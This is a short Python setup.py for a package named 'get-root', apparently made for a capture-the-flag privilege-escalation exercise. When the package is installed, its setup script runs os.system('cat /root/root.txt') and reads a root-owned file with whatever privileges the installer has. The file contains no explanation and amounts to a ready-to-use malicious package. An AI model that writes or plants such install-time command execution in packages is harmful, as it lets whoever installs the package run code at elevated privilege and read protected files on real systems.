 #!/usr/bin/env python

from setuptools import setup
import os

os.system("cat /root/root.txt")

setup(
    name='get-root',    
    version='0.1',                          
    scripts=['get-root']                  
)